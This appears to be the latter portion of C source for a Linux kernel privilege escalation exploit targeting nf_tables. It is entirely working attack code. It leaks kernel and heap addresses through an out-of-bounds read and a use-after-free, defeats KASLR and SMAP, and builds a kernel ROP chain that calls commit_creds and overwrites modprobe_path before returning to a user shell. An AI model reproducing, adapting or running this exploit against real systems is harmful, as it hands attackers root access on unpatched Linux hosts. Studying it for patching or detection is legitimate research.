static int calc_vmlinux(struct nftnl_expr *e, void *cbdata)
{
  const char *data;
  uint32_t kfree_relative;
  uint64_t kfree_hi;
  uint64_t kfree_low;
  uint64_t offset;

  data = nftnl_expr_get_str(e, NFTNL_EXPR_OBJREF_IMM_NAME);
  kfree_relative = *(uint32_t *)data;
  offset = kfree_relative;
  printf("[+] kfree_relative: %p\n", (void *) offset);
  kfree_hi = ((uint64_t)nf_tables + NF_TABLES_KFREE_CALL + 4) & 0xffffffff00000000llu;
  kfree_low = (uint64_t)nf_tables + NF_TABLES_KFREE_CALL + 4 + kfree_relative;
  void *kfree = (void *)(kfree_hi + (kfree_low & 0xffffffff));
  printf("[+] kfree: %p\n", kfree);
  vmlinux = (void *)(kfree - KFREE_OFFSET);

  return MNL_CB_OK;
}

static int calc_objid(struct nftnl_expr *e, void *cbdata)
{
  const char *name;

  name = nftnl_expr_get_str(e, NFTNL_EXPR_OBJREF_IMM_NAME);
  sscanf(name, OBJ_SPRAY_FMT, &ignore_fr_id);

  return MNL_CB_OK;
}

static int calc_heap(struct nftnl_expr *e, void *cbdata)
{
  const char *name;
  uint64_t addr;
  
  name = nftnl_expr_get_str(e, NFTNL_EXPR_OBJREF_IMM_NAME);
  addr = *(uint64_t *)name;
  heap = (void *)(addr << 8ull);

  return MNL_CB_OK;
}

static int get_rule_cb(const struct nlmsghdr *nlh, void *data)
{
  struct nftnl_rule *r;

  r = nftnl_rule_alloc();
  if (r == NULL)
  {
    perror("[-] nftnl_rule_alloc");
    goto err;
  }

  if (nftnl_rule_nlmsg_parse(nlh, r) < 0)
  {
    perror("[-] nftnl_rule_nlmsg_parse");
    goto err_free;
  }

  nftnl_expr_foreach(r, data, NULL);

err_free:
  nftnl_rule_free(r);
err:
  return MNL_CB_OK;
}

static int dump_leak_rule(struct mnl_socket *nl, int (*cb)(struct nftnl_expr *e, void *data))
{
  struct nftnl_rule *r;
  uint32_t seq;
  int ret;
  struct nlmsghdr *nlh;
  char buf[MNL_SOCKET_BUFFER_SIZE];

  r = init_rule(FAMILY, TABLE_NAME_TRIGGER, CHAIN_NAME_OBJ);

  seq = mnl_seq++;
  nlh = nftnl_rule_nlmsg_build_hdr(buf, NFT_MSG_GETRULE, FAMILY,
                                   NLM_F_DUMP, seq);
  nftnl_rule_nlmsg_build_payload(nlh, r);

  if (((ret = mnl_socket_sendto(nl, nlh, nlh->nlmsg_len))) < 0)
  {
    perror("[-] mnl_socket_sendto");
    return ret;
  }
  if ((ret = run_cb(nl, seq, get_rule_cb, cb)) < 0)
  {
    perror("[-] run_cb");
    return ret;
  }
  
  return 0;
}

static int check_obj_data(const struct nlmsghdr *nlh, void *data)
{
  struct nftnl_chain *c;
  const char *udata, *chname;
  uint32_t udlen, chlen;

  c = nftnl_chain_alloc();
  if (c == NULL)
  {
    perror("[-] nftnl_chain_alloc");
    goto err;
  }

  if (nftnl_chain_nlmsg_parse(nlh, c) < 0)
  {
    perror("[-] nftnl_chain_nlmsg_parse");
    goto err_free;
  }

  chname = nftnl_chain_get_data(c, NFTNL_CHAIN_NAME, &chlen);
  udata = nftnl_chain_get_data(c, NFTNL_CHAIN_USERDATA, &udlen);
  if (*(uint64_t *)&udata[NFT_OBJECT_NAME] != 0x4141414141414141llu)
  {
    memcpy(obj_data, udata, udlen);
    memcpy(cname, chname, chlen);
  }
err_free:
  nftnl_chain_free(c);
err:
  return MNL_CB_OK;
}

static int leak_obj_data(struct mnl_socket *nl)
{
  struct nftnl_chain *c;
  uint32_t seq;
  int ret;
  struct nlmsghdr *nlh;
  char buf[MNL_SOCKET_BUFFER_SIZE];
  char objname[128];

  *(uint64_t *)&obj_data[NFT_OBJECT_NAME] = 0x4141414141414141llu;

  for (uint32_t i = chainid_fr; i < chainid_spr; ++i)
  {
    sprintf(objname, CHAIN_SPRAY_FMT, i);
    c = init_chain(TABLE_NAME_TRIGGER, objname, false, NULL, 0);

    seq = mnl_seq++;
    nlh = nftnl_chain_nlmsg_build_hdr(buf, NFT_MSG_GETCHAIN, FAMILY,
                                      NLM_F_ACK, seq);
    nftnl_chain_nlmsg_build_payload(nlh, c);

    if (((ret = mnl_socket_sendto(nl, nlh, nlh->nlmsg_len))) < 0)
    {
      perror("[-] mnl_socket_sendto");
      return ret;
    }

    if ((ret = run_cb(nl, seq, check_obj_data, NULL)) < 0)
    {
      perror("[-] run_cb");
      return ret;
    }

    if (*(uint64_t *)&obj_data[NFT_OBJECT_NAME] != 0x4141414141414141llu)
      return 0;
  }

  printf("[-] Cannot leak object data\n");
  return -1;
}

static void build_krop(char *buf, size_t sz)
{
  memset(buf, 0, sz);
  *(uint64_t *)buf = (uint64_t)vmlinux + PUSH_RDI_POP_RSP_POP_RBP_RET;
  *(uint64_t *)&buf[0x08] = (uint64_t)vmlinux + POP_RDI_RET;
  *(uint64_t *)&buf[0x10] = 0x0;
  *(uint64_t *)&buf[0x18] = (uint64_t)vmlinux + PREPARE_KERNEL_CRED;
  *(uint64_t *)&buf[0x20] = (uint64_t)vmlinux + CMP_ECX_ECX_RET;
  *(uint64_t *)&buf[0x28] = (uint64_t)vmlinux + MOV_RDI_RAX_JNE_RET;
  *(uint64_t *)&buf[0x30] = (uint64_t)vmlinux + COMMIT_CREDS;
  *(uint64_t *)&buf[0x38] = (uint64_t)vmlinux + POP_RDI_RET;
  *(uint64_t *)&buf[0x40] = 0x1;
  *(uint64_t *)&buf[0x48] = (uint64_t)vmlinux + FIND_TASK_BY_VPID;
  *(uint64_t *)&buf[0x50] = (uint64_t)vmlinux + CMP_ECX_ECX_RET;
  *(uint64_t *)&buf[0x58] = (uint64_t)vmlinux + MOV_RDI_RAX_JNE_RET;  
  *(uint64_t *)&buf[0x60] = (uint64_t)vmlinux + POP_RSI_RET;
  *(uint64_t *)&buf[0x68] = (uint64_t)vmlinux + INIT_NSPROXY;
  *(uint64_t *)&buf[0x70] = (uint64_t)vmlinux + SWITCH_TASK_NAMESPACES;
  *(uint64_t *)&buf[0x78] = (uint64_t)vmlinux + POP_RBP_RET;
  *(uint64_t *)&buf[NFT_OBJECT_OPS] = (uint64_t)heap; //to trigger rop by eval (0x80)  
  *(uint64_t *)&buf[0x88] = (uint64_t)vmlinux + POP_RDI_RET;
  *(uint64_t *)&buf[0x90] = 0x0077702f706d742f; //wp/pmt/
  *(uint64_t *)&buf[0x98] = (uint64_t)vmlinux + POP_RSI_RET;
  *(uint64_t *)&buf[0xa0] = (uint64_t)vmlinux + MODPROBE_PATH;
  *(uint64_t *)&buf[0xa8] = (uint64_t)vmlinux + MOV_QWORD_PTR_RSI_RDI_RET;
  *(uint64_t *)&buf[0xb0] = (uint64_t)vmlinux + KPTI_TRAMPOLINE;
  *(uint64_t *)&buf[0xb8] = 0x0; //dummy rax  
  *(uint64_t *)&buf[0xc0] = 0x0; //dummy rdi
  *(uint64_t *)&buf[0xc8] = (unsigned long)get_shell;
  *(uint64_t *)&buf[0xd0] = user_cs;
  *(uint64_t *)&buf[0xd8] = user_rflags;
  *(uint64_t *)&buf[0xe0] = user_sp;
  *(uint64_t *)&buf[0xe8] = user_ss;
}

static void start_echo_sv()
{
  int s, recv_len;
  socklen_t addr_len = sizeof(struct sockaddr_in);
  struct sockaddr_in addr_me, addr_other;
  char buf[4096];

  close(0);
  close(1);
  close(2);

  if ((s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
    return;

  memset(&addr_me, 0, sizeof(struct sockaddr_in));
  memset(&addr_other, 0, sizeof(struct sockaddr_in));

  addr_me.sin_family = AF_INET;
  addr_me.sin_port = htons(PORT_SERVER);
  addr_me.sin_addr.s_addr = htonl(INADDR_ANY);

  if (bind(s, &addr_me, sizeof(struct sockaddr_in)) == -1)
    return;

  while (1)
  {
    if ((recv_len = recvfrom(s, buf, sizeof(buf), 0, &addr_other, &addr_len)) == -1)
      break;
  }
}

int main()
{
  int sock;
  pid_t pid;
  struct mnl_socket *nl;
  struct sockaddr_in sv_addr;
  char buf[256];

  pid = fork();
  if (pid == 0)
  {
    start_echo_sv();
    return 0;
  }

  setbuf(stdout, NULL);
  memset(buf, 0, sizeof(buf));

  printf("[*] Stage 0: Setup namespace sandbox\n");
  if (setup_sandbox())
    return -1;

  printf("[*] Stage 1: Preparation\n");
  printf("[*] Opening netlink socket\n");

  nl = mnl_socket_open(NETLINK_NETFILTER);
  if (nl == NULL)
  {
    perror("[-] mnl_socket_open");
    return -1;
  }

  if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0)
  {
    perror("[-] mnl_socket_bind");
    goto err_mnl_sock;
  }

  printf("[*] Requesting compat modules\n");
  if (request_compat(nl, "AUDIT", 0, 1))
    goto err_mnl_sock;

  printf("[*] Opening UDP socket\n");
  if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
  {
    perror("[-] socket");
    goto err_mnl_sock;
  }

  sv_addr.sin_family = AF_INET;
  sv_addr.sin_port = htons(PORT_SERVER);
  sv_addr.sin_addr.s_addr = htonl(INADDR_ANY);

  printf("[*] Stage 2: Leak nf_tables.ko base address\n");
  printf("[*] Triggering OOB\n");
  if (trigger_set_oob(nl))
    goto err_mnl_sock;
  printf("[*] Trying to leak\n");
  if (leak_nf_tables(nl))
    goto err_mnl_sock;
  if (nf_tables == NULL)
  {
    printf("[-] Cannot leak nf_tables.ko\n");
    goto err_mnl_sock;
  }
  printf("[+] nf_tables: %p\n", nf_tables);

  printf("[*] Stage 3: Setup arbitrary read primitive\n");
  printf("[*] Setting up for UAF\n");
  if (setup_uaf(nl))
    goto err_mnl_sock;
  printf("[*] Force free victim object and setup for arbitrary read\n");
  if (setup_arb_read(nl))
    goto err_mnl_sock;

  printf("[*] Stage 4: Defeat KASLR\n");
  *(uint64_t *)&buf[NFT_OBJECT_NAME] = (uint64_t)nf_tables + NF_TABLES_KFREE_CALL;
  *(uint64_t *)&buf[NFT_OBJECT_OPS] = (uint64_t)nf_tables + NF_TABLES_SECMARK_OBJ_OPS;
  
  if (spray_chain(nl, buf, sizeof(buf), true) < 0)
    goto err_mnl_sock;
  printf("[*] Trying to leak vmlinux\n");
  if (dump_leak_rule(nl, calc_vmlinux))
    goto err_mnl_sock;
  if (vmlinux == NULL)
  {
    printf("[-] Cannot leak vmlinux\n");
    goto err_mnl_sock;
  }
  printf("[+] vmlinux: %p\n", vmlinux);
  
  //currently need to clean up everything
  if (cleanup_first_spray_chain(nl) < 0)
    goto err_mnl_sock;

  printf("[*] Stage 5: Defeat SMAP\n");
  *(uint64_t *)&buf[NFT_OBJECT_NAME] = 0x4141414141414141llu;
  *(uint64_t *)&buf[NFT_OBJECT_OPS] = (uint64_t)vmlinux + DMI_CLASS_KFREE_OFFSET;
  if (spray_chain(nl, buf, sizeof(buf), false) < 0)
    goto err_mnl_sock;
  printf("[*] Triggering object eval\n");
  
  if (sendto(sock, &sock, 1, 0, &sv_addr, sizeof(struct sockaddr_in)) == -1)
  {
    perror("[-] sendto");
    goto err_mnl_sock;
  }
  
  if (spray_objects(nl) < 0)
    goto err_mnl_sock;
  
  if (dump_leak_rule(nl, calc_objid))
    goto err_mnl_sock;
  if (ignore_fr_id == 0)
  {
    printf("[-] Cannot reclaim object\n");
    goto err_mnl_sock;
  }
  printf("[+] Reclamed object: " OBJ_SPRAY_FMT "\n", ignore_fr_id);
  
  printf("[*] Trying to leak reclaimed object data\n");
  
  if (leak_obj_data(nl) < 0)
    goto err_mnl_sock;
  printf("[+] faked_obj->next: %p\n", (void *)(*(uint64_t *)obj_data));

  printf("[+] Marked chain: %s\n", cname);
  if (cleanup_chain(nl,cname) < 0)
    goto err_mnl_sock;
  
  *(uint64_t *)&buf[NFT_OBJECT_NAME] = *(uint64_t *)obj_data + 1 + 8; //to read then shift right 8 bits later
  *(uint64_t *)&buf[NFT_OBJECT_OPS] = (uint64_t)vmlinux + DMI_CLASS_KFREE_OFFSET;
  
  if (spray_chain(nl, buf, sizeof(buf), false) < 0)
    goto err_mnl_sock;
  printf("[*] Trying to leak heap\n");
  
  if (dump_leak_rule(nl, calc_heap))
    goto err_mnl_sock;
  if (heap == NULL)
  {
    printf("[-] Cannot leak heap\n");
    goto err_mnl_sock;
  }
  
  printf("[+] heap (faked_obj->next->prev): %p\n", heap);
  
  printf("[*] Triggering object eval\n");
  if (sendto(sock, &sock, 1, 0, &sv_addr, sizeof(struct sockaddr_in)) == -1)
  {
    perror("[-] sendto\n");
    goto err_mnl_sock;
  }
  
  printf("[*] Stage 6: Save state\n");
  save_state();
  
  printf("[*] Stage 7: Kernel ROP\n");
  build_krop(buf, sizeof(buf));
  if (spray_chain(nl, buf, sizeof(buf), false) < 0)
    goto err_mnl_sock;
  
  printf("[*] Triggering object eval\n");
  if (sendto(sock, &sock, 1, 0, &sv_addr, sizeof(struct sockaddr_in)) == -1)
  {
    perror("[-] sendto\n");
    goto err_mnl_sock;
  }
err_mnl_sock:
  mnl_socket_close(nl);
  return -1;
}